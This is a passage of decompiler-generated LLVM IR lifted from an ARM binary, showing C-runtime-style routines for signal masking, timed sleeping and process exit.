  %v3_12df8 = or i1 %v9_12df4, %v2_12df8
  br i1 %v3_12df8, label %bb45, label %bb46

bb45:                                             ; preds = %dec_label_pc_12df4
  br label %bb46

bb46:                                             ; preds = %dec_label_pc_12df4, %bb45
  %v4_12dfc = phi i32 [ %v4_12dfc1727, %dec_label_pc_12df4 ], [ 0, %bb45 ]
  %v2_12dfc = xor i1 %v9_12df4, true
  %v3_12dfc = and i1 %v3_12df4, %v2_12dfc
  br i1 %v3_12dfc, label %bb47, label %thread-pre-split

bb47:                                             ; preds = %bb46
  %v5_12dfc = urem i32 %v4_12dfc, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb46, %bb47
  %v0_12e00 = phi i32 [ %v5_12dfc, %bb47 ], [ %v4_12dfc, %bb46 ]
  %v2_12e00 = icmp eq i32 %v0_12e00, 0
  br i1 %v2_12e00, label %bb48, label %dec_label_pc_12e0c

bb48:                                             ; preds = %thread-pre-split
  %v4_12e04 = mul i32 %v0_12de4, %v1_12dd8
  %v5_12e04 = add i32 %v4_12e04, %v3_12e04
  store i32 %v5_12e04, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12dac

dec_label_pc_12e0c:                               ; preds = %bb44, %thread-pre-split
  %v0_12e0c = call i32 @function_120c4()
  %v0_12e10 = load i32, i32* %r7.global-to-local, align 4
  %v1_12e10 = load i32, i32* %fp.global-to-local, align 4
  %v2_12e10 = and i32 %v1_12e10, %v0_12e10
  store i32 %v2_12e10, i32* %r7.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  %v2_12e1c = inttoptr i32 %v0_12e0c to i32*
  store i32 34, i32* %v2_12e1c, align 4
  %v0_12dac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12dac

dec_label_pc_12e24:                               ; preds = %bb43
  %v0_12e24.pre = load i32, i32* %sb.global-to-local, align 4
  %v2_12e24 = icmp eq i32 %v0_12e24.pre, 0
  br i1 %v2_12e24, label %bb50, label %bb49

bb49:                                             ; preds = %dec_label_pc_12e24
  %v1_12e28 = load i32, i32* %r6.global-to-local, align 4
  %v3_12e28 = inttoptr i32 %v0_12e24.pre to i32*
  store i32 %v1_12e28, i32* %v3_12e28, align 4
  br label %bb50

bb50:                                             ; preds = %dec_label_pc_12e24, %bb49
  %v0_12e2c = load i32, i32* %r7.global-to-local, align 4
  %v2_12e2c = icmp eq i32 %v0_12e2c, 0
  %. = select i1 %v2_12e2c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v0_12e38 = load i32, i32* %fp.global-to-local, align 4
  %v2_12e38 = icmp eq i32 %v0_12e38, 0
  %v0_12e5c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_12e38, label %dec_label_pc_12e54, label %bb53

bb53:                                             ; preds = %bb50
  %tmp58 = icmp ugt i32 %v0_12e5c.pre.pre, %.
  br i1 %tmp58, label %dec_label_pc_12e44, label %dec_label_pc_12e54

dec_label_pc_12e44:                               ; preds = %bb53
  %v0_12e44 = call i32 @function_120c4()
  %v2_12e4c = inttoptr i32 %v0_12e44 to i32*
  store i32 34, i32* %v2_12e4c, align 4
  %v0_12e50 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12e50, i32* %ip.global-to-local, align 4
  %v0_12e54.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_12e54

dec_label_pc_12e54:                               ; preds = %bb53, %bb50, %dec_label_pc_12e44
  %v0_12e5c.pre = phi i32 [ %v0_12e5c.pre.pre, %bb53 ], [ %v0_12e50, %dec_label_pc_12e44 ], [ %v0_12e5c.pre.pre, %bb50 ]
  %v0_12e54 = phi i32 [ %v0_12e2c, %bb53 ], [ %v0_12e54.pre, %dec_label_pc_12e44 ], [ %v0_12e2c, %bb50 ]
  %v2_12e54 = icmp eq i32 %v0_12e54, 0
  br i1 %v2_12e54, label %dec_label_pc_12e54._crit_edge, label %bb54

bb54:                                             ; preds = %dec_label_pc_12e54
  %v2_12e58 = sub i32 0, %v0_12e5c.pre
  store i32 %v2_12e58, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_12e54._crit_edge

dec_label_pc_12e54._crit_edge:                    ; preds = %dec_label_pc_12e54, %bb54
  %v0_12e5c = phi i32 [ %v2_12e58, %bb54 ], [ %v0_12e5c.pre, %dec_label_pc_12e54 ]
  %v2_12e60 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_12e60, i32* @r4, align 4
  ret i32 %v0_12e5c

; uselistorder directives
  uselistorder i32 %v0_12e5c.pre, { 1, 0 }
  uselistorder i32 %v0_12e5c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v0_12e24.pre, { 1, 0 }
  uselistorder i32 %v4_12dfc, { 1, 0 }
  uselistorder i1 %v3_12df4, { 1, 0 }
  uselistorder i32 %v1_12df4, { 1, 0 }
  uselistorder i32 %v1_12ddc, { 1, 0 }
  uselistorder i32 %v1_12dc0, { 1, 0 }
  uselistorder i32 %v1_12db8, { 1, 0 }
  uselistorder i32 %v0_12dac, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 2, 3, 0, 1, 5, 4, 6 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 4, 2, 3, 5, 6 }
  uselistorder i32 ()* @function_11768, { 3, 1, 4, 2, 0 }
  uselistorder i32 (i32, i32)* @function_11878, { 1, 3, 0, 11, 10, 6, 2, 9, 8, 7, 5, 4 }
  uselistorder i8 45, { 0, 2, 1 }
  uselistorder i8 32, { 0, 8, 9, 10, 1, 11, 12, 2, 3, 13, 4, 5, 6, 7 }
  uselistorder label %dec_label_pc_12e54._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_12e54, { 2, 0, 1 }
  uselistorder label %bb50, { 1, 0 }
  uselistorder label %dec_label_pc_12e0c, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %bb43, { 2, 1, 0 }
  uselistorder label %dec_label_pc_12db0, { 1, 0 }
  uselistorder label %dec_label_pc_12dac, { 1, 0 }
  uselistorder label %dec_label_pc_12d80, { 1, 0 }
  uselistorder label %dec_label_pc_12d24, { 1, 0 }
}

define i32 @function_12e68(i32 %arg1) local_unnamed_addr {
dec_label_pc_12e68:
  %stack_var_-16 = alloca i32, align 4
  %v2_12e68 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r4, align 4
  store i32 %v2_12e68, i32* @r0, align 4
  %v8_12e84 = call i32 @function_13114(i32 %v2_12e68, i32 ptrtoint (i32* @global_var_1310c.372 to i32), i32 ptrtoint (i32* @global_var_1ca3c.426 to i32), i32 78100, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_12e94 = call i32 @function_1310c()
  %v2_12e9c = load i32, i32* @global_var_1caf4.430, align 4
  %v2_12ea0 = icmp eq i32 %v2_12e9c, 0
  br i1 %v2_12ea0, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_12e68
  call void @__pseudo_branch(i32 %v2_12e9c)
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_12e68, %bb
  store i32 %v2_12e68, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_12ec4.432 to i32), i32* @lr, align 4
  %v8_12ec0 = call i32 @function_13114(i32 %v2_12e68, i32 1, i32 ptrtoint (i32* @global_var_1ca3c.426 to i32), i32 78100, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v8_12ec0, i32* @r0, align 4
  %v1_12ec4 = call i32 @function_130a0(i32 %v8_12ec0)
  store i1 true, i1* @cpsr_z, align 1
  %v0_12ed8 = load i32, i32* @r4, align 4
  %v1_12edc = call i32 @function_13510(i32 %v0_12ed8)
  unreachable

; uselistorder directives
  uselistorder i32 %v2_12e68, { 1, 0, 3, 2 }
  uselistorder i32 ()* @function_1310c, { 4, 3, 2, 1, 18, 17, 16, 15, 14, 0, 13, 12, 11, 10, 9, 8, 7, 6, 5, 21, 20, 19 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @function_13114, { 1, 0, 5, 4, 3, 2 }
  uselistorder i32 78100, { 1, 0, 3, 4, 2, 5, 6, 7 }
  uselistorder i32 ptrtoint (i32* @global_var_1ca3c.426 to i32), { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1310c.372 to i32), { 0, 3, 1, 2 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @function_12efc(i32 %arg1) local_unnamed_addr {
dec_label_pc_12efc:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-284 = alloca i32, align 4
  %stack_var_-156 = alloca i32, align 4
  %stack_var_-424 = alloca i32, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_12efc = load i32, i32* @r4, align 4
  store i32 %v3_12efc, i32* %stack_var_-20, align 4
  %v6_12efc = load i32, i32* @r5, align 4
  %v9_12efc = load i32, i32* @r6, align 4
  %v16_12efc = ptrtoint i32* %stack_var_-20 to i32
  store i32 %arg1, i32* @ip, align 4
  %v2_12f00 = icmp eq i32 %arg1, 0
  %v2_12f04 = ptrtoint i32* %stack_var_-424 to i32
  br i1 %v2_12f00, label %dec_label_pc_13088, label %dec_label_pc_12f1c.preheader

dec_label_pc_12f1c.preheader:                     ; preds = %dec_label_pc_12efc
  store i32 31, i32* %r1.global-to-local, align 4
  %v5_12f2417 = add i32 %v16_12efc, 124
  br label %dec_label_pc_12f14

dec_label_pc_12f14:                               ; preds = %dec_label_pc_12f1c.preheader, %dec_label_pc_12f14
  %v5_12f2418 = phi i32 [ %v5_12f2417, %dec_label_pc_12f1c.preheader ], [ %v5_12f24, %dec_label_pc_12f14 ]
  %v2_12f18 = add i32 %v5_12f2418, -136
  %v3_12f18 = inttoptr i32 %v2_12f18 to i32*
  store i32 0, i32* %v3_12f18, align 4
  %v0_12f1c.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12f1c = add i32 %v0_12f1c.pre, -1
  store i32 %v1_12f1c, i32* %r1.global-to-local, align 4
  %v6_12f1c = icmp slt i32 %v1_12f1c, 0
  %v4_12f24 = mul i32 %v1_12f1c, 4
  %v5_12f24 = add i32 %v4_12f24, %v16_12efc
  br i1 %v6_12f1c, label %dec_label_pc_12f2c, label %dec_label_pc_12f14

dec_label_pc_12f2c:                               ; preds = %dec_label_pc_12f14
  %v2_12f2c = ptrtoint i32* %stack_var_-156 to i32
  store i32 0, i32* @r5, align 4
  store i32 %v2_12f2c, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_12f3c = load i32, i32* @ip, align 4
  store i32 %v0_12f3c, i32* %stack_var_-28, align 4
  %v0_12f44 = call i32 @function_12530()
  store i32 %v0_12f44, i32* %r0.global-to-local, align 4
  %v1_12f48 = load i32, i32* @r5, align 4
  %v5_12f4c = icmp slt i32 %v0_12f44, %v1_12f48
  br i1 %v5_12f4c, label %dec_label_pc_13090, label %dec_label_pc_12f50

dec_label_pc_12f50:                               ; preds = %dec_label_pc_12f2c
  %v2_12f50 = ptrtoint i32* %stack_var_-284 to i32
  store i32 %v2_12f50, i32* @r4, align 4
  store i32 %v1_12f48, i32* %r0.global-to-local, align 4
  store i32 %v2_12f2c, i32* %r1.global-to-local, align 4
  %v3_12f60 = bitcast i32* %stack_var_-156 to %_TYPEDEF_sigset_t*
  %v4_12f60 = call i32 @function_11d6c(i32 %v1_12f48, %_TYPEDEF_sigset_t* %v3_12f60, i32 %v2_12f50)
  store i32 %v4_12f60, i32* %r0.global-to-local, align 4
  %v1_12f64 = load i32, i32* @r5, align 4
  %v9_12f64 = icmp eq i32 %v4_12f60, %v1_12f64
  br i1 %v9_12f64, label %dec_label_pc_12f6c, label %dec_label_pc_13090

dec_label_pc_12f6c:                               ; preds = %dec_label_pc_12f50
  store i32 17, i32* %r1.global-to-local, align 4
  store i32 %v2_12f50, i32* %r0.global-to-local, align 4
  %v2_12f74 = call i32 @function_1250c(i32 %v2_12f50, i32 17)
  store i32 %v2_12f74, i32* %r0.global-to-local, align 4
  %v1_12f78 = load i32, i32* @r5, align 4
  %v9_12f78 = icmp eq i32 %v2_12f74, %v1_12f78
  br i1 %v9_12f78, label %dec_label_pc_12f90.preheader, label %dec_label_pc_12f6c.dec_label_pc_13058_crit_edge

dec_label_pc_12f6c.dec_label_pc_13058_crit_edge:  ; preds = %dec_label_pc_12f6c
  %.pre = ptrtoint i32* %stack_var_-28 to i32
  br label %dec_label_pc_13058

dec_label_pc_12f90.preheader:                     ; preds = %dec_label_pc_12f6c
  store i32 31, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_12f88

dec_label_pc_12f88:                               ; preds = %dec_label_pc_12f90.preheader, %dec_label_pc_12f88
  %v5_12f9816 = phi i32 [ %v5_12f2417, %dec_label_pc_12f90.preheader ], [ %v5_12f98, %dec_label_pc_12f88 ]
  %v2_12f8c = add i32 %v5_12f9816, -136
  %v3_12f8c = inttoptr i32 %v2_12f8c to i32*
  store i32 0, i32* %v3_12f8c, align 4
  %v0_12f90.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_12f90 = add i32 %v0_12f90.pre, -1
  store i32 %v1_12f90, i32* %r1.global-to-local, align 4
  %v6_12f90 = icmp slt i32 %v1_12f90, 0
  %v4_12f98 = mul i32 %v1_12f90, 4
  %v5_12f98 = add i32 %v4_12f98, %v16_12efc
  br i1 %v6_12f90, label %dec_label_pc_12fa0, label %dec_label_pc_12f88

dec_label_pc_12fa0:                               ; preds = %dec_label_pc_12f88
  store i32 %v2_12f2c, i32* @r0, align 4
  store i32 17, i32* @r1, align 4
  %v0_12fa8 = call i32 @function_12530()
  store i32 %v0_12fa8, i32* %r0.global-to-local, align 4
  %v1_12fac = icmp slt i32 %v0_12fa8, 0
  br i1 %v1_12fac, label %dec_label_pc_13090, label %dec_label_pc_12fb4

dec_label_pc_12fb4:                               ; preds = %dec_label_pc_12fa0
  store i32 17, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v4_12fc0 = call i32 @function_133f8(i32 17, i32* null, i32 %v2_12f04)
  store i32 %v4_12fc0, i32* %r0.global-to-local, align 4
  %v1_12fc4 = icmp slt i32 %v4_12fc0, 0
  br i1 %v1_12fc4, label %dec_label_pc_12fcc, label %dec_label_pc_12ff4

dec_label_pc_12fcc:                               ; preds = %dec_label_pc_12fb4
  %v0_12fcc = call i32 @function_120c4()
  store i32 %v2_12f50, i32* %r1.global-to-local, align 4
  store i32 %v0_12fcc, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_12fe0 = inttoptr i32 %v0_12fcc to i32*
  %v2_12fe0 = load i32, i32* %v1_12fe0, align 4
  store i32 %v2_12fe0, i32* @r4, align 4
  %v3_12fe4 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_12fe4 = call i32 @function_11d6c(i32 2, %_TYPEDEF_sigset_t* %v3_12fe4, i32 0)
  store i32 -1, i32* %r0.global-to-local, align 4
  %v0_12fec = load i32, i32* @r4, align 4
  %v1_12fec = load i32, i32* %r5.global-to-local, align 4
  %v2_12fec = inttoptr i32 %v1_12fec to i32*
  store i32 %v0_12fec, i32* %v2_12fec, align 4
  %v17_13098.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13094

dec_label_pc_12ff4:                               ; preds = %dec_label_pc_12fb4
  %v2_12ff4 = load i32, i32* %stack_var_-424, align 4
  %v7_12ff8 = icmp eq i32 %v2_12ff4, 1
  %v2_13000 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_13000, i32* @r4, align 4
  br i1 %v7_12ff8, label %dec_label_pc_13008, label %dec_label_pc_1303c

dec_label_pc_13008:                               ; preds = %dec_label_pc_12ff4
  store i32 %v2_13000, i32* %r1.global-to-local, align 4
  store i32 %v2_13000, i32* %r0.global-to-local, align 4
  %v2_13010 = bitcast i32* %stack_var_-28 to %timespec*
  %v3_13010 = call i32 @function_13894(%timespec* %v2_13010, i32 %v2_13000)
  store i32 %v3_13010, i32* %r0.global-to-local, align 4
  store i32 %v3_13010, i32* %r6.global-to-local, align 4
  %v0_13018 = call i32 @function_120c4()
  store i32 %v2_12f50, i32* %r1.global-to-local, align 4
  store i32 %v0_13018, i32* %r5.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v1_1302c = inttoptr i32 %v0_13018 to i32*
  %v2_1302c = load i32, i32* %v1_1302c, align 4
  store i32 %v2_1302c, i32* @r4, align 4
  %v3_13030 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13030 = call i32 @function_11d6c(i32 2, %_TYPEDEF_sigset_t* %v3_13030, i32 0)
  store i32 %v4_13030, i32* %r0.global-to-local, align 4
  %v0_13034 = load i32, i32* @r4, align 4
  %v1_13034 = load i32, i32* %r5.global-to-local, align 4
  %v2_13034 = inttoptr i32 %v1_13034 to i32*
  store i32 %v0_13034, i32* %v2_13034, align 4
  %v0_13064.pr = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13064

dec_label_pc_1303c:                               ; preds = %dec_label_pc_12ff4
  store i32 %v2_12f50, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v3_13048 = bitcast i32* %stack_var_-284 to %_TYPEDEF_sigset_t*
  %v4_13048 = call i32 @function_11d6c(i32 2, %_TYPEDEF_sigset_t* %v3_13048, i32 0)
  store i32 %v4_13048, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13058

dec_label_pc_13058:                               ; preds = %dec_label_pc_12f6c.dec_label_pc_13058_crit_edge, %dec_label_pc_1303c
  %storemerge.pre-phi = phi i32 [ %.pre, %dec_label_pc_12f6c.dec_label_pc_13058_crit_edge ], [ %v2_13000, %dec_label_pc_1303c ]
  store i32 %storemerge.pre-phi, i32* %r0.global-to-local, align 4
  store i32 %storemerge.pre-phi, i32* %r1.global-to-local, align 4
  %v2_1305c = bitcast i32* %stack_var_-28 to %timespec*
  %v3_1305c = call i32 @function_13894(%timespec* %v2_1305c, i32 %storemerge.pre-phi)
  store i32 %v3_1305c, i32* %r0.global-to-local, align 4
  store i32 %v3_1305c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_13064

dec_label_pc_13064:                               ; preds = %dec_label_pc_13008, %dec_label_pc_13058
  %v0_13064 = phi i32 [ %v0_13064.pr, %dec_label_pc_13008 ], [ %v3_1305c, %dec_label_pc_13058 ]
  %v2_13064 = icmp eq i32 %v0_13064, 0
  br i1 %v2_13064, label %dec_label_pc_13088, label %dec_label_pc_1306c

dec_label_pc_1306c:                               ; preds = %dec_label_pc_13064
  store i32 0, i32* %r1.global-to-local, align 4
  %v3_13074 = load i32, i32* %stack_var_-28, align 4
  store i32 %v3_13074, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13094

dec_label_pc_13088:                               ; preds = %dec_label_pc_12efc, %dec_label_pc_13064
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13094

dec_label_pc_13090:                               ; preds = %dec_label_pc_12f50, %dec_label_pc_12fa0, %dec_label_pc_12f2c
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_13094

dec_label_pc_13094:                               ; preds = %dec_label_pc_1306c, %dec_label_pc_13088, %dec_label_pc_12fcc, %dec_label_pc_13090
  %v17_13098 = phi i32 [ %v3_13074, %dec_label_pc_1306c ], [ 0, %dec_label_pc_13088 ], [ %v17_13098.pre, %dec_label_pc_12fcc ], [ -1, %dec_label_pc_13090 ]
  %v2_13098 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_13098, i32* @r4, align 4
  store i32 %v6_12efc, i32* @r5, align 4
  store i32 %v9_12efc, i32* @r6, align 4
  ret i32 %v17_13098

; uselistorder directives
  uselistorder i32 %storemerge.pre-phi, { 1, 2, 0 }
  uselistorder i32 %v2_13000, { 0, 3, 1, 2, 4 }
  uselistorder i32 %v1_12f90, { 0, 2, 1 }
  uselistorder i32 %v2_12f50, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32 %v1_12f48, { 1, 0, 2 }
  uselistorder i32 %v1_12f1c, { 0, 2, 1 }
  uselistorder i32 %v16_12efc, { 1, 2, 0 }
  uselistorder i32* %stack_var_-20, { 0, 2, 1 }
  uselistorder i32* %stack_var_-284, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-28, { 3, 2, 1, 5, 0, 4 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 8, 9, 10, 13, 14 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 5, 6, 0, 8, 7, 10, 9, 21, 11, 13, 14, 12, 16, 15, 17, 22, 18, 2, 19, 20, 1 }
  uselistorder i32 (i32, i32*, i32)* @function_133f8, { 1, 2, 0 }
  uselistorder i32 (i32, %_TYPEDEF_sigset_t*, i32)* @function_11d6c, { 1, 2, 3, 4, 0 }
  uselistorder i32 ()* @function_12530, { 2, 1, 0, 3, 4 }
  uselistorder i32 -136, { 1, 2, 0 }
  uselistorder label %dec_label_pc_13094, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_13090, { 1, 0, 2 }
  uselistorder label %dec_label_pc_13088, { 1, 0 }
  uselistorder label %dec_label_pc_13064, { 1, 0 }
  uselistorder label %dec_label_pc_13058, { 1, 0 }
  uselistorder label %dec_label_pc_12f88, { 1, 0 }
  uselistorder label %dec_label_pc_12f14, { 1, 0 }
}

define i32 @function_130a0(i32 %arg1) local_unnamed_addr {
dec_label_pc_130cc:
  %stack_var_-8 = alloca i32, align 4
  %v3_130a0 = load i32, i32* @r4, align 4
  store i32 %v3_130a0, i32* %stack_var_-8, align 4
  %v2_130d0 = load i32, i32* @global_var_1cb04.439, align 4
  %v2_130d4 = icmp eq i32 %v2_130d0, 0
  br i1 %v2_130d4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_130cc
  store i32 78048, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_130d0)
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_130cc, %bb
  %v2_130e4 = load i32, i32* @global_var_1cb08.441, align 4
  %v2_130e8 = icmp eq i32 %v2_130e4, 0
  br i1 %v2_130e8, label %bb12, label %bb13

bb12:                                             ; preds = %.thread
  %v3_130ec = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_130ec, i32* @r4, align 4
  %v9_130ec = load i32, i32* @r0, align 4
  ret i32 %v9_130ec

bb13:                                             ; preds = %.thread
  store i32 ptrtoint (i32* @global_var_130f8.442 to i32), i32* @lr, align 4
  call void @__pseudo_branch(i32 %v2_130e4)
  %v2_130f8 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_130f8, i32* @r4, align 4
  %v8_130f8 = load i32, i32* @r0, align 4
  ret i32 %v8_130f8

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1310c() local_unnamed_addr {
dec_label_pc_1310c:
  ret i32 0
}

define i32 @function_13114(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_13114:
  %v1_13114 = load i32, i32* @r0, align 4
  ret i32 %v1_13114
}

define i32 @function_13118(i32 %arg1, i64* %arg2) local_unnamed_addr {
dec_label_pc_13118:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i64* %arg2 to i32
  %stack_var_-12 = alloca i32, align 4
  %v3_13118 = load i32, i32* @r4, align 4
  store i32 %v3_13118, i32* %stack_var_-12, align 4
  %v6_13118 = load i32, i32* @r5, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_13128 = call i32 @function_11a2c(i32 %arg1, i32 1)
  %v7_1312c = icmp eq i32 %v2_13128, -1
  br i1 %v7_1312c, label %bb5, label %bb

bb:                                               ; preds = %dec_label_pc_13118
  %v3_13130 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_13130, i32* @r4, align 4
  store i32 %v6_13118, i32* @r5, align 4
  ret i32 %v2_13128

bb5:                                              ; preds = %dec_label_pc_13118
  %v0_13134 = load i32, i32* @r4, align 4
  %v1_13134 = inttoptr i32 %v0_13134 to i64*
  %v5_1313c = call i32 @function_11c1c(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_145d8.444, i32 0, i32 0), i32 %v0_13134)
  %v1_13140 = load i32, i32* %r5.global-to-local, align 4
  %v9_13140 = icmp eq i32 %v5_1313c, %v1_13140
  br i1 %v9_13140, label %bb6, label %bb7

bb6:                                              ; preds = %bb5
  %v3_13144 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_13144, i32* @r4, align 4
  store i32 %v6_13118, i32* @r5, align 4
  ret i32 %v5_1313c

bb7:                                              ; preds = %bb5
  %v0_13148 = call i32 @function_12b74()
  %v0_1314c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1314c, label %bb8, label %bb9

bb8:                                              ; preds = %bb7
  %v4_1314c = load i64, i64* %v1_13134, align 4
  %v6_1314c = trunc i64 %v4_1314c to i32
  %v7_1314c = udiv i64 %v4_1314c, 4294967296
  %v8_1314c = trunc i64 %v7_1314c to i32
  store i32 %v8_1314c, i32* @r4, align 4
  store i32 %v6_1314c, i32* @r5, align 4
  br label %bb9

bb9:                                              ; preds = %bb7, %bb8
  ret i32 %v0_13148

; uselistorder directives
  uselistorder i32 %v2_13128, { 1, 0 }
  uselistorder i32 %v6_13118, { 1, 0 }
  uselistorder i1* @cpsr_z, { 4, 3, 0, 5, 1, 2 }
  uselistorder i32 ()* @function_12b74, { 0, 2, 1, 3 }
  uselistorder i32 (i8*, i32)* @function_11c1c, { 9, 4, 0, 1, 2, 7, 8, 3, 5, 6 }
  uselistorder i32 (i32, i32)* @function_11a2c, { 0, 5, 13, 12, 15, 14, 9, 8, 11, 10, 7, 6, 4, 3, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
}

define i32 @function_13150(i32 %arg1) local_unnamed_addr {
dec_label_pc_13150:
  %v2_13154 = load i32, i32* @global_var_1cb0c.446, align 4
  %v2_13158 = icmp eq i32 %v2_13154, 0
  br i1 %v2_13158, label %bb2, label %bb

bb:                                               ; preds = %dec_label_pc_13150
  %v6_13164 = load i32, i32* @r0, align 4
  ret i32 %v6_13164

bb2:                                              ; preds = %dec_label_pc_13150
  store i32 1, i32* @global_var_1cb0c.446, align 4
  store i32 4096, i32* @global_var_1cb00.397, align 4
  ret i32 undef
}

define i32 @function_131ac(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
dec_label_pc_131ac:
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* %r6.global-to-local, align 4
  %v4_131b0 = mul i32 %arg2, 4
  %v5_131b0 = add i32 %tmp, %v4_131b0
  %v2_131b4 = load i32, i32* %arg3, align 4
  %v2_131b8 = ptrtoint i32* %stack_var_-120 to i32
  %v1_131bc = add i32 %v5_131b0, 4
  %v9_131c0 = icmp eq i32 %v1_131bc, %v2_131b4
  store i32 %arg2, i32* %r8.global-to-local, align 4
  store i32 %arg7, i32* @global_var_1caf8.451, align 4
  store i32 %v1_131bc, i32* @global_var_1cafc.453, align 4
  store i32 %arg6, i32* @global_var_1cb08.441, align 4
  store i32 120, i32* @r2, align 4
  br i1 %v9_131c0, label %bb, label %bb41

bb:                                               ; preds = %dec_label_pc_131ac
  store i32 %v5_131b0, i32* @global_var_1cafc.453, align 4
  br label %bb41

bb41:                                             ; preds = %dec_label_pc_131ac, %bb
  %v2_13200 = bitcast i32* %stack_var_-120 to i8*
  %v3_13200 = call i32 @function_12130(i8* %v2_13200, i32 0)
  %storemerge.pre = load i32, i32* @global_var_1cafc.453, align 4
  br label %dec_label_pc_13210

dec_label_pc_13210:                               ; preds = %dec_label_pc_13210, %bb41
  %storemerge = phi i32 [ %storemerge.pre, %bb41 ], [ %v4_13210, %dec_label_pc_13210 ]
  %v1_13210 = inttoptr i32 %storemerge to i32*
  %v2_13210 = load i32, i32* %v1_13210, align 4
  %v4_13210 = add i32 %storemerge, 4
  %v2_13214 = icmp eq i32 %v2_13210, 0
  br i1 %v2_13214, label %dec_label_pc_13220, label %dec_label_pc_13210

dec_label_pc_13220:                               ; preds = %dec_label_pc_13210
  store i32 %v4_13210, i32* @r4, align 4
  %v1_1324022 = inttoptr i32 %v4_13210 to i32*
  %v2_1324023 = load i32, i32* %v1_1324022, align 4
  %v2_1324425 = icmp eq i32 %v2_1324023, 0
  br i1 %v2_1324425, label %dec_label_pc_1324c, label %dec_label_pc_13228

dec_label_pc_13228:                               ; preds = %dec_label_pc_13220, %dec_label_pc_13240
  %v5_1322c = phi i32 [ %v2_13240, %dec_label_pc_13240 ], [ %v2_1324023, %dec_label_pc_13220 ]
